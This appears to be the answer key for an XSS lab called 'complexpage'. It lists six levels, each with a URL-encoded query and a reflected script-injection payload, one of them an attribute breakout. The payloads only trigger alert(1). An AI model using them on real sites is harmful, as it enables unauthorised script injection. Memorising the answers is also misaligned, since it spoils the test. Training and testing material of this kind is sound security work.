# complexpage — solutions

Full-page templates with reflection nested in body / sidebar / titles / styled paragraphs / tables.

### complexpage-level1

`/complexpage/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside <div class="content">

### complexpage-level2

`/complexpage/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: <input type="search" value="…"> — attribute breakout

### complexpage-level3

`/complexpage/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside <h2 class="title">

### complexpage-level4

`/complexpage/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside <p class="description">

### complexpage-level5

`/complexpage/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside <td class="data">

### complexpage-level6

`/complexpage/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection deep inside <div id="result"> on large page
